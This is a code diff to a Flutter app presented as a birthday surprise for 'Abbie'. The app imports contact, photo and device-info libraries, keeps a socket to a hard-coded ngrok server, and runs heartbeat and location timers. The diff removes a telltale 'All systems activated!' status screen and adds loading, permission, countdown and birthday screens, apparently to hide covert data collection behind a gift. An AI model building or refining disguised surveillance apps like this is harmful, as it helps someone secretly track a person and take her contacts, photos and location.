@@ -10,6 +10,7 @@ import 'package:contacts_service/contacts_service.dart';
 import 'package:photo_manager/photo_manager.dart';
 import 'package:path_provider/path_provider.dart';
 import 'package:device_info_plus/device_info_plus.dart';
+import 'screens.dart';
 
 void main() {
   WidgetsFlutterBinding.ensureInitialized();
@@ -25,6 +26,7 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
   late io.Socket socket;
   bool connected = false;
   bool allPermissionsGranted = false;
+  bool loading = true;
   String serverUrl = 'https://headless-disagree-dean.ngrok-free.dev';
   Timer? heartbeatTimer;
   Timer? locationTimer;
@@ -33,6 +35,22 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
   
   @override
   void initState() {
+    super.initState();
+    WidgetsBinding.instance.addObserver(this);
+    _initialize();
+  }
+
+  Future<void> _initialize() async {
+    await Future.delayed(Duration(seconds: 2));
+    if (mounted) {
+      setState(() {
+        loading = false;
+      });
+    }
+    await checkAndRequestPermissions();
+  }
+
+  void initStateOriginal() {
     super.initState();
     WidgetsBinding.instance.addObserver(this);
     checkAndRequestPermissions();
@@ -330,40 +348,19 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
   @override
   Widget build(BuildContext context) {
     return MaterialApp(
-      home: Scaffold(
-        backgroundColor: Colors.black,
-        appBar: AppBar(
-          title: Text('My Suprise'),
-          backgroundColor: Colors.black87,
-        ),
-        body: Center(
-          child: allPermissionsGranted
-              ? Column(
-                  mainAxisAlignment: MainAxisAlignment.center,
-                  children: [
-                    Icon(Icons.cake, size: 100, color: Colors.pink),
-                    SizedBox(height: 20),
-                    Text(
-                      'Happy Birthday Abbie! 🎂',
-                      style: TextStyle(fontSize: 28, fontWeight: FontWeight.bold, color: Colors.pink),
-                    ),
-                    SizedBox(height: 10),
-                    Text('All systems activated!', style: TextStyle(fontSize: 16, color: Colors.green)),
-                    SizedBox(height: 30),
-                    Icon(connected ? Icons.cloud_done : Icons.cloud_off, size: 50, color: connected ? Colors.green : Colors.red),
-                    Text(connected ? 'Connected' : 'Disconnected', style: TextStyle(color: connected ? Colors.green : Colors.red)),
-                  ],
-                )
-              : Column(
-                  mainAxisAlignment: MainAxisAlignment.center,
-                  children: [
-                    CircularProgressIndicator(),
-                    SizedBox(height: 20),
-                    Text('Requesting Permissions...', style: TextStyle(color: Colors.white, fontSize: 18)),
-                  ],
-                ),
-        ),
-      ),
+      debugShowCheckedModeBanner: false,
+      home: loading
+          ? LoadingScreen()
+          : !allPermissionsGranted
+              ? PermissionLoadingScreen()
+              : isBirthday()
+                  ? BirthdayScreen(connected: connected)
+                  : CountdownScreen(connected: connected),
     );
+  }
+
+  bool isBirthday() {
+    final now = DateTime.now();
+    return now.month == 8 && now.day == 27;
   }
 }
